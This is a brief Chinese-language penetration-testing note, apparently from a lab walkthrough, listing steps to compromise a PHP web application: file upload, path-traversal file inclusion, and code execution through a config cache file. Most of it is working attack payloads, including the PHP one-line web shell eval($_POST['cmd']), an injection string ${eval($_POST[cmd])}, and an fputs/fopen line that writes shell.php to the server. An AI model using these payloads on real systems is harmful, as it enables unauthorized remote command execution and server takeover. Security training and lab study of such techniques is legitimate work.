 

1、文件上传 ![image-20210502222229094](../acess/image-20210502222229094.png)

2、新建文件

```
<?php eval($_POST['cmd']);?>
```

![image-20210502223216385](../acess/image-20210502223216385.png)

3、文件包含漏洞

```
 ../index.html
```

![image-20210502223410798](../acess/image-20210502223410798.png)

4、代码执行 

```
data\config.cache.inc.php
```

php写入文件代码

```
fputs(fopen("shell.php","a"),"<?php phpinfo();?>")
${eval($_POST[cmd])}
<?php eval($_POST[cmd]);?>
```

![image-20210502223722846](../acess/image-20210502223722846.png)